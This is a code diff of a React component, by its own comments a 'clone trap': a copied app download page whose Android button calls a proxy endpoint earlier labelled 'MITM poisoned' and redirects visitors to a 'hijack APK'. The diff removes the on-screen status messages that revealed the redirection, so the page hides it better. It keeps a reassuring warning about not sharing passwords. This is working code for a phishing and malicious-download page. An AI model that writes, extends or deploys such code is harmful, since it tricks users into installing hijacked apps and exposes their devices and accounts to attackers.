@@ -1,6 +1,5 @@
 "use client";
 
-import { useState } from "react";
 import { HIJACK_APK_PATH } from "@/lib/config";
 
 type ApiRow = { type?: string; url?: string };
@@ -10,46 +9,26 @@ async function logHit(action: string) {
     await fetch("/api/hit", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ action, path: "/pages/downapp/index" }),
+      body: JSON.stringify({ action }),
     });
   } catch {
-    /* ignore */
+    /* silent */
   }
 }
 
-type Props = {
-  onApiResponse?: (data: unknown) => void;
-  useMitmProxy?: boolean;
-};
-
-export default function DownAppClone({ onApiResponse, useMitmProxy = true }: Props) {
-  const [status, setStatus] = useState("");
-  const [loading, setLoading] = useState(false);
-
+/** Standalone clone trap (no iframe) — backup if iframe blocked */
+export default function DownAppClone() {
   async function handleAndroidDownload() {
-    setLoading(true);
-    setStatus("Calling /api/downloadlink (MITM poisoned)...");
-
-    const apiPath = useMitmProxy ? "/api/proxy/downloadlink" : "/api/real/downloadlink";
-
     try {
-      const res = await fetch(apiPath, { cache: "no-store" });
+      const res = await fetch("/api/proxy/downloadlink", { cache: "no-store" });
       const json = await res.json();
-      onApiResponse?.(json);
-
       const rows: ApiRow[] = Array.isArray(json.data) ? json.data : [];
       const android = rows.find((r) => String(r.type || "").toLowerCase().includes("android"));
-      const url = android?.url || HIJACK_APK_PATH;
-
-      await logHit("android_apk_download");
-      setStatus(`Redirecting to hijack APK: ${url}`);
-      window.location.href = url;
+      await logHit("clone_download_click");
+      window.location.href = android?.url || HIJACK_APK_PATH;
     } catch {
-      await logHit("android_apk_download_fallback");
-      setStatus("Fallback — direct hijack APK");
+      await logHit("clone_download_fallback");
       window.location.href = HIJACK_APK_PATH;
-    } finally {
-      setLoading(false);
     }
   }
 
@@ -78,7 +57,6 @@ export default function DownAppClone({ onApiResponse, useMitmProxy = true }: Pro
           type="button"
           className="downapp-btn"
           onClick={handleAndroidDownload}
-          disabled={loading}
           aria-label="Download Android APK"
         >
           <img
@@ -110,8 +88,6 @@ export default function DownAppClone({ onApiResponse, useMitmProxy = true }: Pro
         <br />
         Please do not disclose your password, SMS code, or Google verification code to anyone.
       </p>
-
-      {status && <p className="downapp-status">{status}</p>}
     </div>
   );
 }
